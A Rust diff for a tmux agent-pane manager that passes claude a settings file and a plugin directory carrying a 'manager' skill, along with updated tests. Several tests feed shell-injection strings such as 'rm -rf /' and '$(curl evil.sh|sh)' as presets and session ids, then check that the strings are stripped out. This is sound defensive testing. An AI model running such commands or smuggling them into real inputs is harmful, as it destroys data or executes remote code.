@@ -107,16 +107,56 @@ fn changes_host_command() -> String {
     format!("{} pane-host --kind changes", shell_quote(&binary))
 }
 
+/// What Far Cooler hands a claude pane beyond its preset: both are files in
+/// this daemon's runtime directory, and both are claude's flags alone.
+///
+/// - `settings` is `--settings <file>`, the hooks that make the pane report
+///   itself (`write_claude_hook_settings`).
+/// - `plugin_dir` is `--plugin-dir <dir>`, the plugin that carries the manager
+///   skill (`write_claude_plugin`), invoked as `/farcooler:manager`.
+///
+/// One struct rather than a parameter each, because every launch path gets
+/// both from one call to `Service::prepare_launch_hooks` and hands both to
+/// the same builders; a second parameter threaded beside the first is a
+/// second thing each of the four launch paths could forget.
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub struct LaunchExtras {
+    pub settings: Option<PathBuf>,
+    pub plugin_dir: Option<PathBuf>,
+}
+
+impl LaunchExtras {
+    /// An ordinary launch: nothing handed over.
+    pub const NONE: LaunchExtras = LaunchExtras { settings: None, plugin_dir: None };
+
+    #[cfg(test)]
+    fn settings_only(path: &Path) -> Self {
+        Self { settings: Some(path.to_path_buf()), plugin_dir: None }
+    }
+}
+
+/// `--settings <file>` and `--plugin-dir <dir>`, each present only when there
+/// is a file to name, each path `shell_quote`d. Both of claude's arms (a fresh
+/// launch and a resume) build their tail here, so the two can't drift apart.
+fn claude_extra_flags(extras: &LaunchExtras) -> String {
+    let flag = |name: &str, path: &Option<PathBuf>| {
+        path.as_deref()
+            .map(|p| format!(" {name} {}", shell_quote(&p.display().to_string())))
+            .unwrap_or_default()
+    };
+    format!("{}{}", flag("--settings", &extras.settings), flag("--plugin-dir", &extras.plugin_dir))
+}
+
 /// The same launch, plus the settings file that makes the pane report itself.
 ///
-/// `hook_settings` is the file `hook_install::claude_settings` produced,
+/// `extras.settings` is the file `hook_install::claude_settings` produced,
 /// written into this daemon's runtime directory by `write_claude_hook_settings`
 /// and handed to claude as `--settings <file>`. It is claude's arm and nobody
 /// else's: codex and cursor have no equivalent flag and read the project-local
 /// `.codex/hooks.json` and `.cursor/hooks.json` that `install_project_hooks`
 /// merges into a worktree instead.
 ///
-/// `hook_settings: None` is an ordinary launch and produces, byte for byte,
+/// `LaunchExtras::NONE` is an ordinary launch and produces, byte for byte,
 /// the command this function produced before hooks existed.
 ///
 /// **The only entry point, deliberately.** There was a two-argument
@@ -129,7 +169,7 @@ fn changes_host_command() -> String {
 pub fn preset_command_with_hooks(
     preset: &str,
     session_id: Option<&str>,
-    hook_settings: Option<&Path>,
+    extras: &LaunchExtras,
 ) -> String {
     let shell = farcooler_core::shell::login_shell();
     let (agent, model) = match preset.split_once(':') {
@@ -156,9 +196,7 @@ pub fn preset_command_with_hooks(
     // a plain identifier above; this is a real path on a real disk, and on
     // macOS the runtime directory it lives in is under `Application Support`
     // — a space, in the default install, for every user.
-    let settings = hook_settings
-        .map(|p| format!(" --settings {}", shell_quote(&p.display().to_string())))
-        .unwrap_or_default();
+    let settings = claude_extra_flags(extras);
 
     match agent {
         "shell" => format!("{shell} -il"),
@@ -293,6 +331,43 @@ fn write_claude_hook_settings(runtime_dir: &Path) -> Option<PathBuf> {
             None
         }
     }
+}
+
+/// Write claude's plugin, the manager skill, into the runtime directory, and
+/// say where it went.
+///
+/// `--plugin-dir` loads it for that session only (measured: `/farcooler:manager`
+/// answered, and the model was not offered it on its own), so like
+/// `claude-hooks.json` this is Far Cooler's own file in Far Cooler's own
+/// directory and nothing of the user's or the repository's is touched.
+///
+/// Rewritten whenever it differs, with no ownership check: nobody else writes
+/// here, and the owner's ruling is that the skill is regenerated on every
+/// launch, with customization living in the charter. A file that already says
+/// the same thing is not touched, so every later launch costs a read.
+///
+/// `None` on any failure, and the pane launches anyway, as it does without
+/// its hooks: a manager that can't be summoned is not worth a terminal that
+/// won't open.
+fn write_claude_plugin(runtime_dir: &Path) -> Option<PathBuf> {
+    use crate::skill_install::{CLAUDE_PLUGIN_DIR, Harness, render, write_atomically};
+    let dir = runtime_dir.join(CLAUDE_PLUGIN_DIR);
+    let cli = shell_quote(&shim_binary(std::env::current_exe().ok().as_deref()));
+    for file in render(Harness::Claude, &cli) {
+        let path = dir.join(file.relative);
+        if std::fs::read(&path).is_ok_and(|now| now == file.contents.as_bytes()) {
+            continue;
+        }
+        if let Err(e) = write_atomically(&path, &file.contents) {
+            tracing::warn!(
+                error = %e,
+                path = %path.display(),
+                "could not write the manager skill; this pane can't be asked to manage"
+            );
+            return None;
+        }
+    }
+    Some(dir)
 }
 
 /// The function that folds our registrations into one agent's hooks file.
@@ -472,7 +547,7 @@ fn terminal_mode_command(
     preset: &str,
     session_id: &str,
     resumable: bool,
-    hook_settings: Option<&Path>,
+    extras: &LaunchExtras,
 ) -> String {
     let preset = if preset.is_empty() { "shell" } else { preset };
     let shell = farcooler_core::shell::login_shell;
@@ -490,9 +565,7 @@ fn terminal_mode_command(
             // write when there is no settings file: the session id is parsed
             // as a uuid before this branch is chosen, so the payload carries
             // no quote of its own.
-            let settings = hook_settings
-                .map(|p| format!(" --settings {}", shell_quote(&p.display().to_string())))
-                .unwrap_or_default();
+            let settings = claude_extra_flags(extras);
             format!(
                 "{} -ilc {}",
                 shell(),
@@ -507,7 +580,7 @@ fn terminal_mode_command(
             // cannot say the same — `--model` alongside `--resume` has not
             // been checked end to end here, and this file does not invent
             // flags it has not seen work.
-            preset_command_with_hooks(preset, None, hook_settings)
+            preset_command_with_hooks(preset, None, extras)
         }
     } else if preset.starts_with("codex") {
         if resumable {
@@ -529,10 +602,10 @@ fn terminal_mode_command(
             // as a condition at each call site, where the two spellings could
             // disagree — `no_other_agent_is_handed_claudes_settings_flag` is
             // what pins it.
-            preset_command_with_hooks(preset, None, hook_settings)
+            preset_command_with_hooks(preset, None, extras)
         }
     } else {
-        preset_command_with_hooks(preset, None, hook_settings)
+        preset_command_with_hooks(preset, None, extras)
     }
 }
 
@@ -570,7 +643,7 @@ fn respawn_command(
     preset: &str,
     worktree: &str,
     session_id: &str,
-    hook_settings: Option<&Path>,
+    extras: &LaunchExtras,
 ) -> String {
     let resumable = Uuid::parse_str(session_id).is_ok()
         && home.is_some_and(|home| {
@@ -588,7 +661,7 @@ fn respawn_command(
                 session_discovery::transcript_exists(home, Path::new(worktree), session_id)
             }
         });
-    terminal_mode_command(preset, session_id, resumable, hook_settings)
+    terminal_mode_command(preset, session_id, resumable, extras)
 }
 
 /// This user's home directory, or `None` when there is no answer.
@@ -1912,7 +1985,7 @@ impl Service {
     /// file, a hooks file we cannot parse, a runtime directory we cannot write
     /// — each of those costs the live view for that agent in that worktree and
     /// nothing else. A pane that opens quiet beats a pane that will not open.
-    fn prepare_launch_hooks(&self, preset: &str, worktree: &str) -> Option<PathBuf> {
+    fn prepare_launch_hooks(&self, preset: &str, worktree: &str) -> LaunchExtras {
         if let Some((relative, merge)) = project_hook_file_for(preset) {
             install_project_hook_file(
                 &Path::new(worktree).join(relative),
@@ -1924,7 +1997,12 @@ impl Service {
         // gates minting a session id, for the same reason: `--settings` is
         // claude's flag, and putting it in front of another CLI would kill the
         // pane on startup rather than merely leave it quiet.
-        preset.starts_with("claude").then(|| write_claude_hook_settings(&self.root)).flatten()
+        let claude = preset.starts_with("claude");
+        let settings = claude.then(|| write_claude_hook_settings(&self.root)).flatten();
+        // The manager skill, the same way and behind the same gate: a plugin in
+        // the runtime directory, handed over as `--plugin-dir`.
+        let plugin_dir = claude.then(|| write_claude_plugin(&self.root)).flatten();
+        LaunchExtras { settings, plugin_dir }
     }
 
     /// Create a terminal: a tagged tmux window running the preset.
@@ -1984,11 +2062,11 @@ impl Service {
         let term = self.mark_changes_pane(term, command_preset)?;
 
         // 2. Create and tag the window.
-        let hook_settings = self.prepare_launch_hooks(command_preset, &ws.worktree_path);
+        let extras = self.prepare_launch_hooks(command_preset, &ws.worktree_path);
         let command = with_pane_actor(
             term.id,
             command_preset,
-            preset_command_with_hooks(command_preset, declared.as_deref(), hook_settings.as_deref()),
+            preset_command_with_hooks(command_preset, declared.as_deref(), &extras),
         );
         let created = self
             .tmux
@@ -2224,14 +2302,14 @@ impl Service {
         // makes — so it gets the same settings file. It read `preset_command`
         // until this line was found: splitting is how most panes on a runner
         // are made, so most claude panes reported nothing at all.
-        let hook_settings = self.prepare_launch_hooks(command_preset, &ws.worktree_path);
+        let extras = self.prepare_launch_hooks(command_preset, &ws.worktree_path);
         let command = with_pane_actor(
             term.id,
             command_preset,
             preset_command_with_hooks(
                 command_preset,
                 term.agent_session_id.as_deref(),
-                hook_settings.as_deref(),
+                &extras,
             ),
         );
         let created = self
@@ -2346,7 +2424,7 @@ impl Service {
         // the socket, and the pane's activity would sit frozen at whatever it
         // last reported. That is precisely the silent disagreement between
         // record and runtime this whole design exists to prevent.
-        let hook_settings = self.prepare_launch_hooks(&term.command_preset, &ws.worktree_path);
+        let extras = self.prepare_launch_hooks(&term.command_preset, &ws.worktree_path);
         let command = with_pane_actor(
             id,
             &term.command_preset,
@@ -2355,7 +2433,7 @@ impl Service {
                 &term.command_preset,
                 &ws.worktree_path,
                 term.agent_session_id.as_deref().unwrap_or_default(),
-                hook_settings.as_deref(),
+                &extras,
             ),
         );
         // The PANE, not the window. This line used to be
@@ -2678,14 +2756,14 @@ impl Service {
                 // point: a pane going back to a TUI is one question with one
                 // answer, however it got there. See `respawn_command`.
                 let sid = session_id.clone().unwrap_or_default();
-                let hook_settings =
+                let extras =
                     self.prepare_launch_hooks(&term.command_preset, &ws.worktree_path);
                 respawn_command(
                     user_home().as_deref(),
                     &term.command_preset,
                     &ws.worktree_path,
                     &sid,
-                    hook_settings.as_deref(),
+                    &extras,
                 )
             }
             models::PaneMode::Agent => {
@@ -3268,9 +3346,9 @@ mod tests {
         // Startup files, version managers, direnv and aliases must behave like a
         // hand-launched terminal.
         // Quoted now, because a preset may carry a model.
-        assert!(preset_command_with_hooks("claude", None, None).contains("-ilc 'claude'"));
-        assert!(preset_command_with_hooks("shell", None, None).ends_with("-il"));
-        assert!(preset_command_with_hooks("cursor", None, None).contains("cursor-agent"));
+        assert!(preset_command_with_hooks("claude", None, &LaunchExtras::NONE).contains("-ilc 'claude'"));
+        assert!(preset_command_with_hooks("shell", None, &LaunchExtras::NONE).ends_with("-il"));
+        assert!(preset_command_with_hooks("cursor", None, &LaunchExtras::NONE).contains("cursor-agent"));
     }
 
     /// The guard is asked about the path `add_root` canonicalized, so this asks
@@ -3528,7 +3606,7 @@ mod tests {
         // The regression this whole function exists to prevent: a codex pane
         // switched to chat and back used to hardcode `claude`, silently
         // handing the user a different agent in the same pane.
-        let cmd = terminal_mode_command("codex", "", false, None);
+        let cmd = terminal_mode_command("codex", "", false, &LaunchExtras::NONE);
         assert!(cmd.contains("codex"), "must respawn codex: {cmd}");
         assert!(!cmd.contains("claude"), "must not respawn claude: {cmd}");
     }
@@ -3539,7 +3617,7 @@ mod tests {
         // checked end to end the way claude's and codex's have, so both keep
         // starting clean rather than guess at a flag.
         for preset in ["opencode", "cursor"] {
-            let cmd = terminal_mode_command(preset, "", false, None);
+            let cmd = terminal_mode_command(preset, "", false, &LaunchExtras::NONE);
             assert!(!cmd.contains("claude"), "{preset} must not respawn claude: {cmd}");
         }
     }
@@ -3551,7 +3629,7 @@ mod tests {
         // own job is to never invent a flag for a CLI nobody has verified one
         // for, regardless of what it is told.
         for preset in ["opencode", "cursor"] {
-            let cmd = terminal_mode_command(preset, "some-id", true, None);
+            let cmd = terminal_mode_command(preset, "some-id", true, &LaunchExtras::NONE);
             assert!(!cmd.contains("resume"), "{preset} must not resume: {cmd}");
         }
     }
@@ -3559,13 +3637,13 @@ mod tests {
     #[test]
     fn a_resumable_claude_pane_still_gets_resume() {
         let sid = Uuid::now_v7().to_string();
-        let cmd = terminal_mode_command("claude", &sid, true, None);
+        let cmd = terminal_mode_command("claude", &sid, true, &LaunchExtras::NONE);
         assert!(cmd.contains(&format!("claude --resume {sid}")), "{cmd}");
     }
 
     #[test]
     fn a_non_resumable_claude_pane_starts_clean() {
-        let cmd = terminal_mode_command("claude", "some-id", false, None);
+        let cmd = terminal_mode_command("claude", "some-id", false, &LaunchExtras::NONE);
         assert!(!cmd.contains("--resume"), "{cmd}");
         assert!(cmd.contains("claude"), "{cmd}");
     }
@@ -3575,7 +3653,7 @@ mod tests {
         // Verified end to end on a real machine: `codex resume <uuid>`
         // restores the conversation when `codex-acp` wrote a rollout for it.
         let sid = Uuid::now_v7().to_string();
-        let cmd = terminal_mode_command("codex", &sid, true, None);
+        let cmd = terminal_mode_command("codex", &sid, true, &LaunchExtras::NONE);
         assert!(cmd.contains(&format!("codex resume {sid}")), "{cmd}");
     }
 
@@ -3584,7 +3662,7 @@ mod tests {
         // The codex equivalent of claude's "No conversation found": a session
         // id with no completed turn wrote no rollout, and `codex resume`
         // on it fails with an error the user cannot act on.
-        let cmd = terminal_mode_command("codex", "some-id", false, None);
+        let cmd = terminal_mode_command("codex", "some-id", false, &LaunchExtras::NONE);
         assert!(!cmd.contains("resume"), "{cmd}");
         assert!(cmd.contains("codex"), "{cmd}");
     }
@@ -3593,7 +3671,7 @@ mod tests {
     fn an_empty_preset_falls_back_to_a_clean_shell_not_claude() {
         // `command_preset` is always written by `create_terminal`, so empty
         // means "never been an agent pane", not "forgot it was claude".
-        let cmd = terminal_mode_command("", "", false, None);
+        let cmd = terminal_mode_command("", "", false, &LaunchExtras::NONE);
         assert!(!cmd.contains("claude"), "{cmd}");
     }
 }
@@ -3604,30 +3682,30 @@ mod preset_tests {
 
     #[test]
     fn a_bare_preset_runs_the_agent() {
-        assert!(preset_command_with_hooks("claude", None, None).contains("'claude'"));
-        assert!(preset_command_with_hooks("codex", None, None).contains("'codex'"));
-        assert!(preset_command_with_hooks("cursor", None, None).contains("'cursor-agent'"));
-        assert!(preset_command_with_hooks("shell", None, None).ends_with("-il"));
+        assert!(preset_command_with_hooks("claude", None, &LaunchExtras::NONE).contains("'claude'"));
+        assert!(preset_command_with_hooks("codex", None, &LaunchExtras::NONE).contains("'codex'"));
+        assert!(preset_command_with_hooks("cursor", None, &LaunchExtras::NONE).contains("'cursor-agent'"));
+        assert!(preset_command_with_hooks("shell", None, &LaunchExtras::NONE).ends_with("-il"));
     }
 
     #[test]
     fn a_model_is_passed_through() {
-        assert!(preset_command_with_hooks("claude:opus", None, None).contains("claude --model opus"));
-        assert!(preset_command_with_hooks("codex:gpt-5.6-sol", None, None).contains("codex --model gpt-5.6-sol"));
+        assert!(preset_command_with_hooks("claude:opus", None, &LaunchExtras::NONE).contains("claude --model opus"));
+        assert!(preset_command_with_hooks("codex:gpt-5.6-sol", None, &LaunchExtras::NONE).contains("codex --model gpt-5.6-sol"));
     }
 
     #[test]
     fn a_model_that_is_not_an_identifier_is_dropped_not_escaped() {
         // This string reaches a `-ilc` argument. Dropping it loses nothing real
         // and leaves no argument about quoting.
-        let out = preset_command_with_hooks("claude:opus'; rm -rf /; '", None, None);
+        let out = preset_command_with_hooks("claude:opus'; rm -rf /; '", None, &LaunchExtras::NONE);
         assert!(!out.contains("rm -rf"));
         assert!(out.contains("'claude'"));
     }
 
     #[test]
     fn an_unrecognized_preset_that_is_not_an_identifier_runs_nothing() {
-        let out = preset_command_with_hooks("$(curl evil.sh|sh)", None, None);
+        let out = preset_command_with_hooks("$(curl evil.sh|sh)", None, &LaunchExtras::NONE);
         assert!(!out.contains("curl"));
         assert!(out.ends_with("-il"), "falls back to a plain shell");
     }
@@ -3635,8 +3713,8 @@ mod preset_tests {
     #[test]
     fn a_custom_agent_name_still_works() {
         // Presets are not a closed set: someone's own wrapper should run.
-        assert!(preset_command_with_hooks("aider", None, None).contains("'aider'"));
-        assert!(preset_command_with_hooks("aider:sonnet", None, None).contains("aider --model sonnet"));
+        assert!(preset_command_with_hooks("aider", None, &LaunchExtras::NONE).contains("'aider'"));
+        assert!(preset_command_with_hooks("aider:sonnet", None, &LaunchExtras::NONE).contains("aider --model sonnet"));
     }
 
     /// The task brief writes this test with `Some("a-session")` and asserts
@@ -3653,7 +3731,7 @@ mod preset_tests {
         let command = preset_command_with_hooks(
             "claude",
             Some(SESSION),
-            Some(Path::new("/tmp/fc/hooks.json")),
+            &LaunchExtras::settings_only(Path::new("/tmp/fc/hooks.json")),
         );
         assert!(command.contains("--settings"), "a launched pane reports what it is doing: {command}");
         assert!(
@@ -3666,7 +3744,7 @@ mod preset_tests {
     #[test]
     fn the_settings_path_is_quoted_like_every_other_interpolation_here() {
         let command =
-            preset_command_with_hooks("claude", None, Some(Path::new("/tmp/My Runner/hooks.json")));
+            preset_command_with_hooks("claude", None, &LaunchExtras::settings_only(Path::new("/tmp/My Runner/hooks.json")));
         assert!(
             command.contains("'/tmp/My Runner/hooks.json'")
                 || command.contains("\"/tmp/My Runner/hooks.json\""),
@@ -3686,12 +3764,12 @@ mod preset_tests {
         // here; the equality could not have caught any of them.
         let shell = farcooler_core::shell::login_shell();
         assert_eq!(
-            preset_command_with_hooks("claude", None, None),
+            preset_command_with_hooks("claude", None, &LaunchExtras::NONE),
             format!("{shell} -ilc 'claude'"),
             "hooks are additive; nothing about an existing launch changes"
         );
         assert_eq!(
-            preset_command_with_hooks("claude:opus", Some("018f5b2c-0000-7000-8000-000000000000"), None),
+            preset_command_with_hooks("claude:opus", Some("018f5b2c-0000-7000-8000-000000000000"), &LaunchExtras::NONE),
             format!("{shell} -ilc 'claude --model opus --session-id 018f5b2c-0000-7000-8000-000000000000'"),
             "and the model and session id land exactly where they always did"
         );
@@ -3705,9 +3783,9 @@ mod preset_tests {
     #[test]
     fn no_other_agent_is_handed_claudes_settings_flag() {
         for preset in ["codex", "cursor", "shell", "aider", "claude-ish"] {
-            let with = preset_command_with_hooks(preset, None, Some(Path::new("/tmp/fc/h.json")));
+            let with = preset_command_with_hooks(preset, None, &LaunchExtras::settings_only(Path::new("/tmp/fc/h.json")));
             assert!(!with.contains("--settings"), "{preset}: {with}");
-            assert_eq!(with, preset_command_with_hooks(preset, None, None), "{preset}: {with}");
+            assert_eq!(with, preset_command_with_hooks(preset, None, &LaunchExtras::NONE), "{preset}: {with}");
         }
     }
 
@@ -3727,7 +3805,7 @@ mod preset_tests {
     #[test]
     fn the_settings_path_survives_both_shells_as_one_argument() {
         let path = "/tmp/My Runner/hooks.json";
-        let command = preset_command_with_hooks("claude", None, Some(Path::new(path)));
+        let command = preset_command_with_hooks("claude", None, &LaunchExtras::settings_only(Path::new(path)));
 
         // The login shell is whatever this machine's user has; `sh` is enough
         // to parse the `-ilc` payload and is the same parser in the way that
@@ -3749,17 +3827,68 @@ mod preset_tests {
         );
     }
 
+    /// Run a claude launch command through both of its shells with `claude`
+    /// swapped for a `printf` that joins its arguments with commas, and return
+    /// what came out: a path that split in two shows up as two fields. The
+    /// technique is `the_settings_path_survives_both_shells_as_one_argument`'s.
+    #[cfg(unix)]
+    pub(super) fn claude_argv_through_both_shells(command: &str) -> String {
+        let prefix = format!("{} -ilc", farcooler_core::shell::login_shell());
+        // The FIRST `claude` only: it is the program, and the paths after it
+        // can hold the word (`claude-plugin`, or a temp directory's name).
+        let probe = command.replacen(&prefix, "/bin/sh -c", 1).replacen("claude", "printf ,%s", 1);
+        assert!(probe.starts_with("/bin/sh -c"), "the prefix was found and replaced: {probe}");
+        let out = std::process::Command::new("/bin/sh")
+            .arg("-c")
+            .arg(&probe)
+            .output()
+            .expect("run the probe");
+        String::from_utf8_lossy(&out.stdout).into_owned()
+    }
+
+    /// Beside `--settings`, through both shells, as one argument each: the
+    /// runtime directory on macOS is under `Application Support`, with a
+    /// space, for every user.
+    #[cfg(unix)]
+    #[test]
+    fn a_claude_launch_carries_the_plugin_dir_as_one_argument() {
+        let (s, p) = ("/tmp/My Runner/hooks.json", "/tmp/My Runner/claude-plugin");
+        let extras = LaunchExtras { settings: Some(s.into()), plugin_dir: Some(p.into()) };
+        let command = preset_command_with_hooks("claude", None, &extras);
+        assert_eq!(claude_argv_through_both_shells(&command), format!(",--settings,{s},--plugin-dir,{p}"));
+    }
+
+    /// `--plugin-dir` is claude's. codex has no such flag and would refuse to
+    /// start, and cursor's copy of the skill comes from the worktree's
+    /// `.agents/skills` instead.
+    #[test]
+    fn only_claude_is_handed_a_plugin_dir() {
+        let extras = LaunchExtras {
+            settings: Some("/tmp/fc/h.json".into()),
+            plugin_dir: Some("/tmp/fc/claude-plugin".into()),
+        };
+        for preset in ["codex", "codex:gpt-5.6-sol", "cursor", "shell", "aider", CHANGES_PRESET] {
+            let with = preset_command_with_hooks(preset, None, &extras);
+            assert!(!with.contains("--plugin-dir"), "{preset}: {with}");
+            for resumable in [false, true] {
+                let back = terminal_mode_command(preset, "018f5b2c-0000-7000-8000-00000000000e", resumable, &extras);
+                assert!(!back.contains("--plugin-dir"), "{preset} resumable={resumable}: {back}");
+            }
+        }
+        assert!(preset_command_with_hooks("claude:opus", None, &extras).contains("--plugin-dir"));
+    }
+
     #[test]
     fn a_claude_terminal_is_launched_with_the_session_id_we_chose() {
         // So that switching this pane to agent mode later is a lookup rather
         // than a guess about which of several .jsonl files is ours.
-        let cmd = preset_command_with_hooks("claude", Some("018f5b2c-0000-7000-8000-000000000000"), None);
+        let cmd = preset_command_with_hooks("claude", Some("018f5b2c-0000-7000-8000-000000000000"), &LaunchExtras::NONE);
         assert!(cmd.contains("--session-id 018f5b2c-0000-7000-8000-000000000000"), "{cmd}");
     }
 
     #[test]
     fn a_shell_is_not_given_a_session_id() {
-        let cmd = preset_command_with_hooks("shell", Some("018f5b2c-0000-7000-8000-000000000000"), None);
+        let cmd = preset_command_with_hooks("shell", Some("018f5b2c-0000-7000-8000-000000000000"), &LaunchExtras::NONE);
         assert!(!cmd.contains("--session-id"), "{cmd}");
     }
 
@@ -3767,7 +3896,7 @@ mod preset_tests {
     fn a_session_id_that_is_not_a_uuid_is_dropped_rather_than_escaped() {
         // It ends up inside a `-ilc` string. The existing rule for models
         // applies here for the same reason.
-        let cmd = preset_command_with_hooks("claude", Some("; rm -rf /"), None);
+        let cmd = preset_command_with_hooks("claude", Some("; rm -rf /"), &LaunchExtras::NONE);
         assert!(!cmd.contains("rm -rf"), "{cmd}");
         assert!(!cmd.contains("--session-id"), "{cmd}");
     }
@@ -4700,7 +4829,7 @@ mod pane_actor_tests {
             "$(curl evil.sh|sh)",
             "claude opus",
         ] {
-            let command = preset_command_with_hooks(preset, None, None);
+            let command = preset_command_with_hooks(preset, None, &LaunchExtras::NONE);
             let launched_an_agent =
                 command != a_persons_shell && command != the_changes_host;
             assert_eq!(
@@ -4860,7 +4989,7 @@ mod respawn_tests {
         let sid = Uuid::now_v7().to_string();
         a_claude_transcript(&home, &worktree, &sid);
 
-        let cmd = respawn_command(Some(&home), "claude", worktree.to_str().unwrap(), &sid, None);
+        let cmd = respawn_command(Some(&home), "claude", worktree.to_str().unwrap(), &sid, &LaunchExtras::NONE);
         assert!(cmd.contains(&format!("claude --resume {sid}")), "must reopen it: {cmd}");
         assert!(!cmd.contains("--session-id"), "--session-id names a NEW conversation: {cmd}");
     }
@@ -4876,7 +5005,7 @@ mod respawn_tests {
         let worktree = scratch("claude-clean-tree");
         let sid = Uuid::now_v7().to_string();
 
-        let cmd = respawn_command(Some(&home), "claude", worktree.to_str().unwrap(), &sid, None);
+        let cmd = respawn_command(Some(&home), "claude", worktree.to_str().unwrap(), &sid, &LaunchExtras::NONE);
         assert!(cmd.contains("claude"), "{cmd}");
         assert!(!cmd.contains("--resume"), "nothing on disk to resume: {cmd}");
         assert!(!cmd.contains("--session-id"), "{cmd}");
@@ -4895,7 +5024,7 @@ mod respawn_tests {
         std::fs::create_dir_all(&dir).unwrap();
         std::fs::write(dir.join(format!("rollout-2026-08-03T10-33-15-{sid}.jsonl")), "{}").unwrap();
 
-        let cmd = respawn_command(Some(&home), "codex", worktree.to_str().unwrap(), &sid, None);
+        let cmd = respawn_command(Some(&home), "codex", worktree.to_str().unwrap(), &sid, &LaunchExtras::NONE);
         assert!(cmd.contains(&format!("codex resume {sid}")), "{cmd}");
     }
 
@@ -4910,7 +5039,7 @@ mod respawn_tests {
         let sid = "not-a-uuid'; echo pwned; '";
         a_claude_transcript(&home, &worktree, sid);
 
-        let cmd = respawn_command(Some(&home), "claude", worktree.to_str().unwrap(), sid, None);
+        let cmd = respawn_command(Some(&home), "claude", worktree.to_str().unwrap(), sid, &LaunchExtras::NONE);
         assert!(!cmd.contains("--resume"), "{cmd}");
         assert!(!cmd.contains("pwned"), "{cmd}");
     }
@@ -4919,7 +5048,7 @@ mod respawn_tests {
     fn no_home_directory_at_all_starts_clean_rather_than_resuming_blind() {
         let worktree = scratch("nohome-tree");
         let sid = Uuid::now_v7().to_string();
-        let cmd = respawn_command(None, "claude", worktree.to_str().unwrap(), &sid, None);
+        let cmd = respawn_command(None, "claude", worktree.to_str().unwrap(), &sid, &LaunchExtras::NONE);
         assert!(!cmd.contains("--resume"), "{cmd}");
         assert!(cmd.contains("claude"), "{cmd}");
     }
@@ -4956,7 +5085,7 @@ mod respawn_tests {
         let worktree = scratch("adopt-tree");
         let kept = preset_after_adopting("claude:opus", "claude")
             .unwrap_or_else(|| "claude:opus".to_string());
-        let cmd = respawn_command(Some(&home), &kept, worktree.to_str().unwrap(), "", None);
+        let cmd = respawn_command(Some(&home), &kept, worktree.to_str().unwrap(), "", &LaunchExtras::NONE);
         assert!(cmd.contains("claude --model opus"), "{cmd}");
     }
 
@@ -4968,9 +5097,9 @@ mod respawn_tests {
         // this builder must not quietly cost it.
         let home = scratch("model-home");
         let worktree = scratch("model-tree");
-        let cmd = respawn_command(Some(&home), "claude:opus", worktree.to_str().unwrap(), "", None);
+        let cmd = respawn_command(Some(&home), "claude:opus", worktree.to_str().unwrap(), "", &LaunchExtras::NONE);
         assert!(cmd.contains("claude --model opus"), "{cmd}");
-        let cmd = respawn_command(Some(&home), "codex:gpt-5.6-sol", worktree.to_str().unwrap(), "", None);
+        let cmd = respawn_command(Some(&home), "codex:gpt-5.6-sol", worktree.to_str().unwrap(), "", &LaunchExtras::NONE);
         assert!(cmd.contains("codex --model gpt-5.6-sol"), "{cmd}");
     }
 
@@ -4985,7 +5114,7 @@ mod respawn_tests {
         let worktree = scratch("shell-fallback-tree");
         let shell = farcooler_core::shell::login_shell();
         for preset in ["claude", "codex", "cursor", "opencode", "claude:opus"] {
-            let cmd = respawn_command(Some(&home), preset, worktree.to_str().unwrap(), "", None);
+            let cmd = respawn_command(Some(&home), preset, worktree.to_str().unwrap(), "", &LaunchExtras::NONE);
             assert_ne!(cmd, format!("{shell} -il"), "{preset} came back as a shell: {cmd}");
             assert!(cmd.contains("-ilc"), "{preset} must run something: {cmd}");
         }
@@ -6572,6 +6701,49 @@ mod hook_file_tests {
         );
     }
 
+    /// The call site, end to end: parse `--plugin-dir` out of the command
+    /// tmux was actually handed, and read the skill back from where it
+    /// points. Fails if `prepare_launch_hooks` stops writing the plugin, even
+    /// with `write_claude_plugin` itself still present and working.
+    #[tokio::test]
+    async fn opening_a_claude_pane_puts_the_skill_where_the_flag_points() {
+        let (_dir, svc, ws) = super::restart_wiring_tests::a_workspace().await;
+        let term = svc.create_terminal(ws.id, "manager", "claude").await.expect("a claude pane");
+
+        let command = super::restart_wiring_tests::pane_start_command(&svc, term.id).await;
+        // tmux prints a start command inside double quotes, with a backslash
+        // before each backslash, double quote and dollar sign in it. Undo that
+        // to get the string tmux handed `sh -c`.
+        let quoted = command.strip_prefix('"').and_then(|c| c.strip_suffix('"')).unwrap_or(&command);
+        let (mut unquoted, mut chars) = (String::new(), quoted.chars());
+        while let Some(c) = chars.next() {
+            unquoted.push(if c == '\\' { chars.next().unwrap_or(c) } else { c });
+        }
+        let command = unquoted.as_str();
+        // From the login shell on: the `env FARCOOLER_ACTOR=…` in front is
+        // `with_pane_actor`'s, and this probe is about claude's own argv.
+        let shell = format!("{} -ilc", farcooler_core::shell::login_shell());
+        let from_shell = command.find(&shell).map_or(command, |at| &command[at..]);
+        let argv = super::preset_tests::claude_argv_through_both_shells(from_shell);
+        let dir = argv
+            .split(',')
+            .skip_while(|a| *a != "--plugin-dir")
+            .nth(1)
+            .unwrap_or_else(|| panic!("the pane was launched with no --plugin-dir: {command} -> {argv}"));
+
+        let skill = std::fs::read_to_string(Path::new(dir).join("skills/manager/SKILL.md"))
+            .unwrap_or_else(|e| panic!("no skill where --plugin-dir points ({dir}): {e}"));
+        assert!(skill.contains("**Never execute a task yourself.**"), "{skill}");
+        let cli = shell_quote(&shim_binary(std::env::current_exe().ok().as_deref()));
+        assert!(skill.contains(&format!("{cli} task list")), "the skill names this runner's CLI: {skill}");
+        let manifest = std::fs::read_to_string(Path::new(dir).join(".claude-plugin/plugin.json"))
+            .expect("a plugin manifest");
+        assert!(manifest.contains("\"farcooler\""), "{manifest}");
+
+        // Nothing of the skill went into the repository: claude's copy is ours.
+        assert!(!Path::new(&ws.worktree_path).join(".agents").exists());
+    }
+
     /// `adopt_branch` is the other door into "a worktree Far Cooler just
     /// made" — work picked up from a branch pushed somewhere else. It runs
     /// the same agents in the same panes, so a pane that reports nothing is
@@ -6686,7 +6858,7 @@ mod hook_file_tests {
             "claude",
             "018f5b2c-0000-7000-8000-00000000000b",
             true,
-            Some(Path::new("/tmp/fc/hooks.json")),
+            &LaunchExtras::settings_only(Path::new("/tmp/fc/hooks.json")),
         );
         assert!(command.contains("--resume"), "it is still a resume: {command}");
         assert!(command.contains("--settings"), "and it still reports itself: {command}");
@@ -6698,7 +6870,7 @@ mod hook_file_tests {
         // The other half of the claude branch: a session with nothing on disk
         // behind it starts fresh, and a fresh start is a launch like any other.
         let command =
-            terminal_mode_command("claude:opus", "", false, Some(Path::new("/tmp/fc/hooks.json")));
